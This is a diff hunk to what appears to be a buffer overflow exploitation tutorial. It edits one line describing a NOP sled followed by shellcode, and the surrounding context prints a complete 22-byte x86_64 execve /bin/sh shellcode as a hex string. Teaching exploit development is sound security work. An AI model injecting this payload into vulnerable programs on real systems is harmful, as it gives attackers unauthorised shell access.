@@ -91,7 +91,7 @@ The same happens but the rip address now points to **0x00007f0090909090**.
 
 We need to add to the end of the _NOP-sled_ our _shellcode:_ **"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"**
 
-This is a generic _linux-x86_64 execve /bin/sh shellcode:_
+This is a generic 22 bytes _linux-x86_64 execve /bin/sh shellcode:_
 
 Its asm code is:
 ```
